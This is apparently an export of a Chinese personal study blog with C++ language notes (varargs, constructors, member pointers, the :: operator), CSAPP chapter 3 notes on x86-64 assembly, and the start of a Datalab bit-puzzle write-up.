<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> n, ...)</span> </span>&#123;</span><br><span class="line">	      <span class="keyword">long</span> s = <span class="number">0</span>; <span class="keyword">int</span>* p = &amp;n + <span class="number">1</span>;    <span class="comment">//p指向第1个省略参数</span></span><br><span class="line">	      <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++)  s += p[k];</span><br><span class="line">      <span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">( )</span> </span>&#123;</span><br><span class="line">	      <span class="keyword">int</span> a = <span class="number">4</span>;  <span class="keyword">long</span> s = <span class="built_in">sum</span>(<span class="number">3</span>, a, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">//执行完后s=9</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>另外就是省略参数和给出的参数连续存放，所以&amp;n+1可以获得第一个省略参数的地址。</p>
</li>
<li><p>函数参数可以是默认值，<strong>调用时如果没传实参则使用默认值</strong>，声明时所有默认值参数需要出现在所有非默认值参数的后面</p>
</li>
<li><p>对于内联函数，如果内联了虚函数或包含分支的函数，则内联失败，注意内联失败指的不是报错，而是将其编译成函数调用指令</p>
</li>
<li><p>关于函数作用域，有如下等级：整个程序&gt;一个代码文件&gt;函数体&gt;语句块&gt;表达式，作用域越小，被访问的优先级越高</p>
</li>
</ol>
<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><h2 id="基本注意事项"><a href="#基本注意事项" class="headerlink" title="基本注意事项"></a>基本注意事项</h2><ol>
<li><p>联合也是类</p>
</li>
<li><p>程序的不同结束方式对对象产生影响，在abort退出的时候，所有对象自动调用的析构函数不能正常执行，在exit退出的时候，局部自动对象不能调用析构函数，所以这两种情况下需要显示调用析构函数。同时，我们提倡使用return退出程序</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> “string.cpp”  	<span class="comment">//不提倡这样include：因为string.cpp内有函数定义</span></span></span><br><span class="line"><span class="comment">//这个是自己定义的一个字符串的类</span></span><br><span class="line"><span class="function">STRING <span class="title">x</span><span class="params">(<span class="string">&quot;global&quot;</span>)</span></span>;	<span class="comment">//自动调用构造函数初始化x</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">      <span class="keyword">short</span> error=<span class="number">0</span>;</span><br><span class="line">      <span class="function">STRING <span class="title">y</span><span class="params">(<span class="string">&quot;local&quot;</span>)</span></span>;	<span class="comment">//自动调用构造函数初始化y</span></span><br><span class="line">      <span class="built_in"><span class="keyword">switch</span></span>(error) &#123;</span><br><span class="line">      <span class="keyword">case</span>  <span class="number">0</span>: <span class="keyword">return</span>;  	<span class="comment">//正常返回时自动析构x、y</span></span><br><span class="line">      <span class="keyword">case</span>  <span class="number">1</span>: y.~<span class="built_in">STRING</span>( );	<span class="comment">//为防内存泄漏，exit退出前必须显式析构y</span></span><br><span class="line">            	    <span class="built_in">exit</span>(<span class="number">1</span>);		    </span><br><span class="line">      <span class="keyword">default</span>: x.~<span class="built_in">STRING</span>( );	<span class="comment">//为防内存泄漏，abort退出前须显式析构x、y</span></span><br><span class="line">	    y.~<span class="built_in">STRING</span>( ); </span><br><span class="line">	    <span class="built_in">abort</span>( );</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>我们知道如果自己没有定义一个构造函数的话，程序会有一个默认构造函数，还会有默认拷贝构造函数，我们可以用<strong>delete</strong>或<strong>default</strong>来进行选择</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">A</span>( ) = <span class="keyword">delete</span>;		<span class="comment">//删除产生构造函数A( )</span></span><br><span class="line">    <span class="built_in">A</span>(<span class="keyword">int</span> m): <span class="built_in">x</span>(m) &#123; &#125;</span><br><span class="line">    <span class="built_in">A</span>(<span class="keyword">const</span> A&amp;a) = <span class="keyword">default</span>;	<span class="comment">//接受编译生成的拷贝构造函数A(const A&amp;)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="function">A <span class="title">x</span><span class="params">(<span class="number">2</span>)</span></span>;			<span class="comment">//调用自定义的单参构造函数A(int)</span></span><br><span class="line">    <span class="function">A <span class="title">y</span><span class="params">(x)</span></span>;			<span class="comment">//调用编译生成的拷贝构造函数A(const A&amp;)</span></span><br><span class="line">    <span class="comment">//A u;			//错误：u要调用构造函数A( )，但A( )被删除	</span></span><br><span class="line">    <span class="function">A <span class="title">v</span><span class="params">( )</span></span>;			<span class="comment">//正确：说明外部无参非成员函数v，且返回类型为A</span></span><br><span class="line">&#125;<span class="comment">//“A v( );”等价于“extern  A v( );”</span></span><br></pre></td></tr></table></figure>
<p>A v()竟然是定义了一个函数 :astonished: </p>
</li>
<li><p>对于访问权限，感觉这里很重要，每年考试都会考</p>
<ul>
<li>对于public，任何函数均可访问</li>
<li>对于private，只有本类成员可以访问，剩下的都无法访问</li>
<li>对于protected，只有本类和派生类成员函数可以访问</li>
<li>构造函数和析构函数可以理解成具有任何访问权限</li>
<li>友元函数不受这些限制</li>
</ul>
</li>
<li><p>在类内定义的函数会<strong>自动内联</strong>，在类外定义的话需要inline修饰，匿名类函数成员只能在类内定义</p>
</li>
<li><p>匿名联合需要定义成static，并且内部只能定义公有成员</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">union</span> &#123;</span> <span class="keyword">int</span> x, y, z; &#125;;</span><br><span class="line"><span class="comment">//int y=5;  	       //错：本作用域已定义y</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123; </span><br><span class="line">    x=<span class="number">3</span>; std::cout&lt;&lt;y; <span class="comment">//输出3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>new运算符可以对析构的变量重新构造，减少对象的变量说明个数，提高内存使用效率，如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">STRING  <span class="title">x</span> <span class="params">(<span class="string">&quot;Hello!&quot;</span>)</span>, *p</span>=&amp;x;</span><br><span class="line">x. ~<span class="built_in">STRING</span> ( );</span><br><span class="line"><span class="keyword">new</span> (&amp;x) <span class="built_in">STRING</span> (<span class="string">&quot;The World&quot;</span>);</span><br><span class="line"><span class="keyword">new</span> (p) <span class="built_in">STRING</span> (<span class="string">&quot;The World&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于隐含参数<strong>this</strong>，由于对象调用函数成员时，对象的地址作为函数的第一个实参首先压栈，通过这种方式将其传给this，另外就是this本身只读，指向变量可写，而类的静态成员函数没有this指针，这是因为静态成员函数不依赖对象调用</p>
</li>
<li><p>在类定义只读和引用的非静态成员的时候，需要在使用之前初始化，如果没有默认值，必须定义构造函数来初始化，使用<strong>初始化列表</strong>来初始化这些函数。另外如果一个类里定义了另一个非静态类，并且需要用带参构造函数构造，那么该类需要提供相应的带参构造函数，如果没有定义构造函数的话也可以使用{}来初始化</p>
</li>
<li><p>对象数组中的每一个成员都应该初始化，默认调用<strong>无参构造函数</strong>进行初始化</p>
</li>
<li><p>用常量对象做实参，优先调用参数为<strong>无址引用&amp;&amp;</strong>的构造函数，用变量等做实参，优先调用参数为<strong>&amp;</strong>的构造函数。</p>
</li>
</ol>
<h2 id="成员和成员指针"><a href="#成员和成员指针" class="headerlink" title="成员和成员指针"></a>成员和成员指针</h2><ol>
<li><p>首先成员指针是成员相对于对象首地址的偏移量，不是真正的代表地址的指针，因此成员指针不能移动，也不能进行类型转换，否则会出现各种各样的问题</p>
</li>
<li><p>关键字<strong>mutable</strong>，说明该变量将永远处于易变状态，并且不能用于修饰静态成员，或许应该结合const来使用：在成员函数后加const修饰this指向对象，表示不会改变对象，但是如果想要改变对象中的某个值，将该成员用mutable修饰即可。<strong>const和volatile是影响重载的</strong>，而volatile只能修改非只读变量，主要还是去体会<strong>这些关键字实际上修饰的都是this</strong>，const volatile :cold_sweat:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRODUCT</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>* name;			<span class="comment">//产品名称</span></span><br><span class="line">    <span class="keyword">int</span>  price;			<span class="comment">//产品价格</span></span><br><span class="line">    <span class="keyword">int</span>  quantity;			<span class="comment">//产品数量</span></span><br><span class="line">    <span class="keyword">mutable</span> <span class="keyword">int</span> count;		<span class="comment">//产品查询次数</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">PRODUCT</span>(<span class="keyword">const</span> <span class="keyword">char</span>* n, <span class="keyword">int</span> m, <span class="keyword">int</span> p);</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">buy</span><span class="params">(<span class="keyword">int</span> money)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span>&amp; p, <span class="keyword">int</span>&amp; q)</span><span class="keyword">const</span></span>;</span><br><span class="line">    ~<span class="built_in">PRODUCT</span>(<span class="keyword">void</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PRODUCT::get</span><span class="params">(<span class="keyword">int</span> &amp;p, <span class="keyword">int</span> &amp;q)</span><span class="keyword">const</span></span>&#123;<span class="comment">//const  PRODUCT *const this</span></span><br><span class="line">    p=price;       q=quantity; <span class="comment">//当前对象为const对象，故其成员不能被修改</span></span><br><span class="line">    count++;    		<span class="comment">//但count为mutable成员，可以修改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于静态数据成员，在类里声明，在类外面只定义一次，通常用来描述这个类整体的一种信息，不能定义成位段成员，函数中的局部类不能定义静态数据成员</p>
</li>
<li><p>对于静态函数成员，没有this参数，在类内部声明或定义，所以不能是析构函数、构造函数、虚函数等等带有this参数的函数，其参数表后不能出现const这样的修饰符，但是返回值可以用这些修饰，在类外定义的时候不需要再用static修饰</p>
</li>
<li><p>静态成员指针是指向类的静态成员的指针，和普通指针没什么区别，但是和普通成员指针有区别，前者存放地址，后者存放偏移，所以静态成员指针也可以强制类型转换</p>
</li>
</ol>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>编程语言</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的::</title>
    <url>/2021/12/07/C-%E4%B8%AD%E7%9A%84/</url>
    <content><![CDATA[<h1 id="用法一"><a href="#用法一" class="headerlink" title="用法一"></a>用法一</h1><p>​    用来说明类作用域，用来表明类的变量</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a, *b;</span><br><span class="line">    <span class="keyword">int</span> A::*u;   <span class="keyword">int</span> A::*A::*x;</span><br><span class="line">    <span class="keyword">int</span> A::**y; <span class="keyword">int</span> *A::*z;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> c, A::*d;</span><br><span class="line">&#125;z;</span><br></pre></td></tr></table></figure>
<p>​    最开始见到这种写法的时候感觉还晕乎乎的，现在来看的话，int A::*u指的应该是定义了一个指针u，指向类A中的一个整形数据成员，而像int A::<em>A::\</em>x这种写法应该是定义了一个指针x，指向类A中的一个指针，并且这个类A中的指针是一个整形指针。例子中的写法是确定了指针指向的变量所处的类。</p>
<h1 id="用法二"><a href="#用法二" class="headerlink" title="用法二"></a>用法二</h1><p>​    命名空间作用域，用来注明所使用的类或函数是哪个命名空间的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::cout&lt;&lt;<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h1 id="用法三"><a href="#用法三" class="headerlink" title="用法三"></a>用法三</h1><p>​    全局作用域，用来区分全局或局部。有的时候在局部定义一个函数，可能出现无法调用全局函数的情况，这是因为这两个函数名字相同，这个时候就需要在函数名前面加上::表示调用了全局函数</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>编程语言</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP第三章学习笔记</title>
    <url>/2022/03/05/CSAPP%E7%AC%AC%E4%B8%89%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h1><p>​    本章主要是关于x86汇编的一些东西，正好和目前学校在教的汇编语言是相对应的。这篇笔记大概就是关于在阅读CSAPP第三章的时候对于一些疑难知识的解释以及重要知识的记录。</p>
<p>​    注意，学校教的是intel格式的汇编，CSAPP里讲的是AT&amp;T格式的汇编。</p>
<h1 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h1><p>​    假设一个C程序有两个文件p1.c和p2.c，采用如下命令编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Og -o p p1.c p2.c</span><br></pre></td></tr></table></figure>
<p>​    其中大O参数对应的是gcc采用的优化选项，就和洛谷OJ上提供的O1优化或O2优化选项类似。由于较高级别的优化会使得产生的代码严重变形，难以学习，所以这里使用-Og优化。</p>
<p>​    对于这一条命令，gcc调用了一整套的程序将源代码转换成可执行文件，大致过程如下：</p>
<ol>
<li><strong>C预处理器</strong>插入所有用#include指定的文件，并把宏定义作替换。</li>
<li><strong>编译器</strong>产生两个文件的汇编代码，名字分别为p1.s和p2.s。</li>
<li><strong>汇编器</strong>将汇编代码转换成二进制目标代码文件p1.o和p2.o。</li>
<li><strong>链接器</strong>将两个目标代码文件与实现库函数（如printf）文件的代码合并，并用-o命令指定最终的目标文件。</li>
</ol>
<h2 id="机器级代码"><a href="#机器级代码" class="headerlink" title="机器级代码"></a>机器级代码</h2><p>​    计算机系统使用了多种不同的<strong>抽象</strong>，下面两种很重要：</p>
<ol>
<li>由<strong>指令集体系结构或指令集架构</strong>来定义机器级程序的格式和行为，它定义了处理器状态、指令的格式、以及每条指令对状态的影响。</li>
<li>机器级程序使用的内存地址是<strong>虚拟地址</strong>，提供的内存模型看上去是一个很大的、按字节寻址的数组。</li>
</ol>
<p>​    机器代码呈现了很多在C程序中不可见的处理器状态，如：</p>
<ol>
<li><strong>程序计数器</strong>（PC，在x86汇编中用%rip表示），给出了将要执行的下一条指令在内存中的地址。</li>
<li>整数寄存器文件，主要是用来存储64位的值的，比如一些地址或者整数数据。</li>
<li>条件码寄存器，保存着最近执行的一些算数或逻辑指令的状态信息。</li>
<li>向量寄存器，可以存放一个或多个整数或浮点数的值。</li>
</ol>
<p>​    现在看这些可能还是云里雾里，什么都不太清楚，但是在后面这些处理器的作用都会逐一详细介绍的。</p>
<h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><p>​    假定有一个C文件mstore.c，在命令行使用-S选项就可以得到汇编代码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Og -S mstore.c</span><br></pre></td></tr></table></figure>
<p>​    在汇编代码中会<strong>除去所有关于局部变量名或数据类型的信息。</strong></p>
<p>​    再使用如下命令，就会编译并汇编该代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Og -c mstore.c</span><br></pre></td></tr></table></figure>
<p>​    这产生的目标代码文件是二进制格式的。无法直接查看。但是可以用反汇编器来查看。GDB中有相关的查看的方法，在后文会提到。</p>
<p>​    当然也有直接的命令可以查看，比如可以使用如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d mstore.o</span><br></pre></td></tr></table></figure>
<p>​    另外，如果去查看汇编代码的内容，会发现有一些行是以“.”开头的，这些是指导汇编器和链接器工作的<strong>伪指令</strong>，通常不用管它。</p>
<p>​    <strong>注意，汇编代码通常有不同的格式，书中使用的是ATT格式的汇编代码，使用-masm参数可以产生Intel格式的汇编</strong></p>
<h1 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h1><div class="table-container">
<table>
<thead>
<tr>
<th>C声明</th>
<th style="text-align:center">Intel数据类型</th>
<th>汇编代码后缀</th>
<th>大小（字节）</th>
</tr>
</thead>
<tbody>
<tr>
<td>char</td>
<td style="text-align:center">字节</td>
<td>b</td>
<td>1</td>
</tr>
<tr>
<td>short</td>
<td style="text-align:center">字</td>
<td>w</td>
<td>2</td>
</tr>
<tr>
<td>int</td>
<td style="text-align:center">双字</td>
<td>l</td>
<td>4</td>
</tr>
<tr>
<td>long</td>
<td style="text-align:center">四字</td>
<td>q</td>
<td>8</td>
</tr>
<tr>
<td>char*</td>
<td style="text-align:center">四字</td>
<td>q</td>
<td>8</td>
</tr>
<tr>
<td>float</td>
<td style="text-align:center">单精度</td>
<td>s</td>
<td>4</td>
</tr>
<tr>
<td>double</td>
<td style="text-align:center">双精度</td>
<td>l</td>
<td>8</td>
</tr>
</tbody>
</table>
</div>
<p>​    <strong>需要额外注意的是，指针也是四个字节</strong></p>
<h1 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h1><p>​    一个x86-64的中央处理器单元（CPU）包含一组16个存储64位值的<strong>通用目的寄存器</strong>。这些寄存器用来存储整数数据和指针。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144658207.png" alt="image-20220326144658207"></p>
<p>​    相关的指令可以对这16个寄存器的低位字节存放的不同大小的数据进行操作。对于生成小于8字节1结果的指令，对于剩下的字节，有如下两条规则：</p>
<ol>
<li>生成1字节和2字节数字的指令会保持剩下的字节不变。</li>
<li>生成四字节的数字的指令会把高位4个字节置为0.。</li>
</ol>
<p>​    上图中最右边的一列指明了在常见的程序中这些寄存器扮演什么样的角色。</p>
<h2 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h2><p>​    大多数指令都有一个或多个<strong>操作数</strong>，指示当前操作要使用的源数据值以及放置结果的目的位置。操作数分为如下三种类型：</p>
<ol>
<li><strong>立即数</strong>，用来表示一个常数值。在ATT格式的汇编中，一般用$后面跟一个用标准C表示法表示的整数</li>
<li><strong>寄存器</strong>，用来表示某个寄存器的内容。</li>
<li><strong>内存引用</strong>，根据计算出来的地址访问某个内存位置。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144718866.png" alt="image-20220326144718866"></p>
<p>​    上面的图表示了常见的几种操作数格式。比较通用的应该就是最后一行</p>
<h2 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h2><p>​    <strong>指令类</strong>中包含了一系列指令，这些指令执行的操作都相同，区别在于操作数的大小不同。</p>
<p>​    最简单的数据传送指令是<strong>MOV类</strong>，见下表</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144734226.png" alt="image-20220326144734226"></p>
<p>​    该命令的作用就是把数据从源位置复制到目的位置。</p>
<p>​    源操作数指定的是一个立即数，目的操作数是一个位置，可以是寄存器也可以是内存位置。但是MOV指令有一条限制，即<strong>两个操作数不能都指向内存位置</strong></p>
<p>​    MOV指令只会更新目的操作数制定的那些寄存器字节或内存位置。唯一的例外是movl指令以寄存器作为目的时，它会把该寄存器的高位4字节设置为0。</p>
<p>​    常规的movq指令只能以表示为32位补码数字的立即数作为源操作数。movabsq指令能以任意64位立即数值作为源操作数，并且只能以寄存器作为目的</p>
<p>​    还有另外两个指令类，即MOVZ和MOVS。可以将较小的源值复制到较大的目的。区别在于前者把目的中的剩余字节填充为0，而后者通过符号扩展来填充。如下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144754078.png" alt="image-20220326144754078"></p>
<p>​    另外还有<strong>cltq</strong>指令，它总是以寄存器%eax作为源，%rax作为符号扩展结果的目的</p>
<h2 id="数据传送示例"><a href="#数据传送示例" class="headerlink" title="数据传送示例"></a>数据传送示例</h2><p>​    首先要明确函数参数通过寄存器转给函数。</p>
<p>​    这里主要是说间接引用指针就是把这个指针放在寄存器里。像局部变量都是保存在寄存器中，因为访问寄存器要更快。</p>
<h2 id="压入和弹出栈数据"><a href="#压入和弹出栈数据" class="headerlink" title="压入和弹出栈数据"></a>压入和弹出栈数据</h2><p>​    主要就是下面这两个操作吧。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144811960.png" alt="image-20220326144811960"></p>
<p>​    栈指针%rsp保存着栈顶元素的地址。在入栈的时候，比如说要把一个四字值压倒栈里，首先要将栈指针减8，然后将值写到新的栈顶地址。这么说的话，其实push命令也可以用sub和mov命令实现，不过这样会消耗比较多的资源。</p>
<h1 id="算术和逻辑操作"><a href="#算术和逻辑操作" class="headerlink" title="算术和逻辑操作"></a>算术和逻辑操作</h1><p>​    主要介绍的就是下面这张图里的吧。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144835378.png" alt="image-20220326144835378"></p>
<p>​    接下来会分别对这些进行解析。</p>
<h2 id="加载有效地址"><a href="#加载有效地址" class="headerlink" title="加载有效地址"></a>加载有效地址</h2><p>​    该操作leaq实际上是movq指令的变形，主要是从内存读数据到寄存器，但是它并没有引用内存，该指令将有效地址写入目的操作数。</p>
<p>​    很多时候这个操作会有一些妙用吧，拿csapp的练习题来说，更多的或许是用来计算加减乘除？</p>
<h2 id="一元和二元操作"><a href="#一元和二元操作" class="headerlink" title="一元和二元操作"></a>一元和二元操作</h2><p>​    从名字上看就非常显然了，一元操作符和二元操作符。</p>
<p>​    一元操作只有一个操作数，这个操作数可以是一个寄存器，也可以是一个内存位置。</p>
<p>​    二元操作的第二个操作数既是源又是目的。第一个操作数可以是立即数 、寄存器或是内存位置，第二个操作数可以是寄存器或是内存位置。当第二个操作数为内存地址时，处理器必须从内存读出值，执行操作，再把结果写回内存。</p>
<h2 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h2><p>​    移位操作是最后一组操作。</p>
<p>​    先给出移位量，第二项给出要移位的数。移位量可以是立即数，也可以放在单字节寄存器%cl中。因为<strong>只允许以这个特定的寄存器作为操作数</strong></p>
<h2 id="特殊的算术操作"><a href="#特殊的算术操作" class="headerlink" title="特殊的算术操作"></a>特殊的算术操作</h2><p>​    这里给出了支持两个64位数乘除法的运算符</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144949417.png" alt="image-20220326144949417"></p>
<p>​    注意图3-10里面也有一个imul，那一个就是从两个64位操作数得到两个64位乘积，就是通过截断</p>
<p>​    这里的是用两个寄存器存储最终得到的128位的结果，需要把一个参数存到%rax寄存器里，然后另一个指令作为源操作数，最终结果的低位存到%rax中，高位存储到%rdx中。</p>
<p>​    除法或取模操作由单操作数除法指令来提供。有符号数除法指令<strong>idivq</strong>将寄存器%rdx（高64位）和%rax（低64位）中的128位数作为被除数，除数作为指令的操作数给出。指令将商存在寄存器%rax中，将余数存在寄存器%rdx中。正因为这么一个要求，很多时候需要把这两个寄存器里的值移到别的位置。</p>
<p>​    指令cqto读出%rax的符号位，并将它复制到%rdx的所有位。</p>
<h1 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h1><p>​    这一部分主要是说分支和循环对应的汇编代码。主要使用jump命令</p>
<h2 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h2><p>​    CPU维护着一组单个位的<strong>条件码寄存器</strong>，主要用来描述最近的算术或者逻辑操作的属性。</p>
<ul>
<li><code>CF</code>：进位标志。最近的操作使最高位产生了进位。可用来检查无符号操作数的溢出。</li>
<li><code>ZF</code>：零标志。最近的操作得出的结果为0。</li>
<li><code>SF</code>：符号标志。最近的操作得到的结果为负数。</li>
<li><code>OF</code>：溢出标志。最近的操作数导致一个补码溢出——正溢出或负溢出。</li>
</ul>
<p>​    <code>leaq</code>操作不会改变任何的条件码，因为它仅仅是对地址的操作。</p>
<p>​    下面的表格中的操作比较重要，很多分支和循环的条件产生都要靠它。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326145010561.png" alt="image-20220326145010561"></p>
<p>​    这两类操作<strong>只设置条件码，不更改任何寄存器</strong>，注意比较顺序。</p>
<h2 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h2><p>​    条件码通常不会被直接读取，常用的使用方法有三种：</p>
<ol>
<li>根据条件码的某种组合，将一个字节设置为0或者1。</li>
<li>可以根据条件跳转到程序的某个其他的部分。</li>
<li>可以有条件地传送数据。</li>
</ol>
<p>​     对于第一种情况，常用的有<code>set</code>指令，它的后缀指的不是操作数大小，而是相应的情况。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326145030285.png" alt="image-20220326145030285"></p>
<p>​    这些都是四种条件码相互运算的结果。</p>
<h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><p>​    跳转指令主要是核查目前的条件码，如果满足条件的话就跳转到某个标签，就和<code>goto</code>语句差不多</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326145045759.png" alt="image-20220326145045759"></p>
<p>​    其中<code>jmp</code>是无条件跳转，有如下两种跳转方式：</p>
<ul>
<li>直接跳转，跳转到标签</li>
<li>简介跳转，跳转目标从寄存器或者内存地址读出，特征是“*”后面跟一个操作数指示符。</li>
</ul>
<h2 id="跳转指令的编码"><a href="#跳转指令的编码" class="headerlink" title="跳转指令的编码"></a>跳转指令的编码</h2><p>​    跳转指令有几种不同的编码，最常见的是<strong>PC相对的</strong>，会将目标指令的地址与<strong>紧跟在跳转指令后面那条指令的地址</strong>之间的差作为编码。这种编码方式比较简介。</p>
<p>​    也可以直接用四个字节给出绝对地址。</p>
<h2 id="用条件控制来实现条件分支"><a href="#用条件控制来实现条件分支" class="headerlink" title="用条件控制来实现条件分支"></a>用条件控制来实现条件分支</h2><p>​    常见的C语言的条件判断模板如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(test-expr)</span><br><span class="line">    then-statement</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">else</span>-statement</span><br></pre></td></tr></table></figure>
<p>​    而汇编语言会将其转化成下面的模板</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">t = test-expr;</span><br><span class="line"><span class="keyword">if</span> (!t)</span><br><span class="line">    <span class="keyword">goto</span> <span class="literal">false</span>;</span><br><span class="line">  then-statement</span><br><span class="line">  <span class="keyword">goto</span> done;</span><br><span class="line"><span class="literal">false</span>:</span><br><span class="line">  <span class="keyword">else</span>-statement</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>
<p>​    实际上这种转换就是说如果条件满足就沿着这条路径执行，如果不满足就走另外一条路径。就是所谓的使用<strong>控制</strong>的条件转移。</p>
<h2 id="用条件传送来实现条件分支"><a href="#用条件传送来实现条件分支" class="headerlink" title="用条件传送来实现条件分支"></a>用条件传送来实现条件分支</h2><p>​    上面的那种机制简单而容易理解，但是在现代处理器上可能会运行的非常<strong>低效</strong></p>
<p>​    一种替代的策略是使用<strong>数据</strong>的条件转移。这种方法计算一个条件操作的两种结果，然后再根据条件是否满足从中选取一个。只有在一些受限制的情况下这种策略才可行，但如果可行，就可以用一条简单的<strong>条件传送</strong>指令来实现它。</p>
<p>​    这种方法可以大幅度提高性能，主要原因会在后面提到，简单地说，处理器通过<code>pipelining</code>来获得高性能，这种方法通过重叠连续指令的步骤来获得高性能，比如</p>
]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>Datalab</title>
    <url>/2022/02/27/Datalab/</url>
    <content><![CDATA[<h1>整形部分</h1>
<h2 id="bitXor"><a class="header-anchor" href="#bitXor">¶</a>bitXor</h2>
<p>​	本题要求使用<sub>和&amp;两种运算实现^，其实这是很简单的，利用数字逻辑里学过的方法可以将异或门用与门和非门表示，类似的就可以得到用</sub>和&amp;表示^的逻辑表达式。</p>
<h2 id="tmin"><a class="header-anchor" href="#tmin">¶</a>tmin</h2>
<p>​	本题要求利用*! ~ &amp; ^ | + &lt;&lt; &gt;&gt;*获得二进制补码整数的最小值，根据补码的相关知识，其实只需要用&lt;&lt;即可，即对二进制1右移31位即可。</p>
<h2 id="isTmax"><a class="header-anchor" href="#isTmax">¶</a>isTmax</h2>
<p>​	本题要求利用*! ~ &amp; ^ | +*判断参数x是否是int型的最大值，如果是则返回1，否则返回0。主要思路就是让x逐渐靠近0，然后在整个式子前面取非即可。</p>
<p>​	关于这个靠近零的方法，假设x就是最大值，即0x7fffffff，那再加一个1就变成了0x80000000，接下来再加x就可以得到-1，再加1就可以得到0。</p>
